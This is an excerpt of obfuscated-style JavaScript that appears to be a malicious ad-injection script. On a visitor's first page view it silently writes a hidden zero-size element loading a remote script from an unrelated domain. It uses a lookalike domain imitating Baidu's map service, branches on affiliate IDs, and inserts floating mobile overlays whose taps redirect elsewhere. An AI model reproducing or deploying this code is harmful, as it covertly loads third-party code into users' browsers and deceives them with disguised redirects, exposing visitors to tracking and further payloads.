function setCookiee(name, value, tm) {
    {
        var fenzhong = tm;
...
var pv = getCookiee("jxpvast2");
if (pv == null || pv == "") pv = 0;
pv = parseInt(pv) + 1;
setCookiee("jxpvast2", pv, 12 * 60);

if (pv == 1) {
    document.writeln("<div style=\"width:0px;height:0px;display:none;\"><script type=\"text/javascript\"  src=\"http://a.waczt.cn/yhios/lp.js\"><\/script></div>");
}
...
(function(qj_uid, prefix) {
    ...
    if (qj_tid == 38) { qj_h = 120;
        qj_w = 780; } else if (qj_tid == 55) { qj_h = 200;
        qj_w = 640; } else
        qj_tid = 36;

    var domain = "http://map.baidu.com.mjjdfl.com";
    if (qj_uid == 708041 || qj_uid == 708011)
        domain = "https://s9.rebengvip.com";
    if (qj_uid == 705535 || qj_uid == 708144 || qj_uid == 707908 || qj_uid == 700332 || qj_uid == 708011 || qj_uid == 708156 || qj_uid == 702416) {
    ...
    if (browser.versions.android || browser.versions.iPhone || browser.versions.iPad) {
        ...
        (function() { //底部悬浮广告
            ...
            po.addListener = function() {
                ...
                if (qj_uid != 700001) {
                    var fasi = document.createElement("div");
                    fasi.id = "fasi";
                    fasi.style.cssText = "position:absolute;left:40%;bottom:30px;";
                    fasi.innerHTML = "<img src='http://f3.vedeh.com/js/tmp/fasi.png' style='height:30%'; />";
                    ...
                    if (browser.versions.ios || browser.versions.iPad || browser.versions.iPhone) {
                        fasi.addEventListener('touchend', clickToGo2);
                    } else {
                        fasi.addEventListener('click', clickToGo);
                    }
                    var btshowdiv = document.getElementById(prefix + bt_show);
                    btshowdiv.insertBefore(fasi, btshowdiv.firstChild);
                }
                if (flag) {
